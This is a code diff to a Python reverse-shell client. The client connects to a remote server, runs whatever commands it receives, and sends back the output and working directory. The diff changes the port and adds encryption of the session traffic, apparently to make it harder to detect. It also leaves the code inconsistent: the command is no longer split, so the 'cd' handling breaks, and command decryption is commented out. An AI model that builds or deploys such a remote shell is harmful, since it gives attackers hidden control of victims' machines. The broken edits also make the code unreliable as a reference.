@@ -8,7 +8,7 @@ import hellobitch.cryptofernet as crypt
 
 SERVER_HOST = sys.argv[1]
 __CLEF__ = crypt.create_key()
-SERVER_PORT = 80
+SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -20,19 +20,22 @@ if __name__ == "__main__":
 
     # get the current directory
     cwd = os.getcwd()
-    s.send(cwd.encode())
+    cwd_encrypted = crypt.encrypt_str(__CLEF__, cwd)
     s.send(__CLEF__)
+    s.send(cwd_encrypted)
 
     while True:
         # receive the command from the server
-
         command = s.recv(BUFFER_SIZE).decode()
-        if not command: continue
-        splited_command = command.split()
+#        command_decrypt = crypt.decrypt_str(__CLEF__, command)
+       # command_decrypt = crypt.decrypt_str(command)
+        if not command:
+            continue
+        splited_command = command
         if command.lower() == "exit":
             # if the command is exit, just break out of the loop
             break
-        if splited_command[0].lower() == "cd":
+        if splited_command.lower() == "cd":
             # cd command, change directory
             try:
                 os.chdir(' '.join(splited_command[1:]))
@@ -48,7 +51,11 @@ if __name__ == "__main__":
         # get the current working directory as output
         cwd = os.getcwd()
         # send the results back to the server
-        message = f"{output}{SEPARATOR}{cwd}"
-        s.send(message.encode())
+        message_encrypt = crypt.encrypt_str(__CLEF__, f"{output}{SEPARATOR}{cwd}")
+        output = crypt.encrypt_str(__CLEF__, output)
+        #s.send(output)
+        #cwd = f'{cwd}'
+        #s.send(crypt.encrypt_str(__CLEF__, cwd))
+        s.send(message_encrypt)
     # close client connection
     s.close()
